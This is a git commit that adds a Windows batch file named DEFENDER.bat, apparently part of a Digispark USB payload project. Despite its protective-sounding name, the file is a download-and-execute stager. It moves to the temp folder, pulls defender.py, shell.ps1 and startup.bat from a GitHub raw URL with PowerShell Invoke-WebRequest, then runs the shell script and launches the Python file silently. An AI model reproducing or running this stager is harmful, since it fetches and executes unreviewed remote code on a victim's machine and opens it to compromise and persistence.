d7a710a8381e15e1ee70c56e87448d5f079a917f
ashwanthcreators <85355780+ashwanthcreators@users.noreply.github.com>
2024-03-18 17:10:13 +0530

    Add files via upload

---
+++ DEFENDER.bat
@@ -0,0 +1,13 @@
+cd %TEMP%
+powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/defender.py -OutFile defender.py
+powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/shell.ps1 -OutFile shell.ps1
+powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/startup.bat -OutFile startup.bat
+powershell .\shell.ps1
+pythonw defender.py
+exit
+
+
+
+
+
+
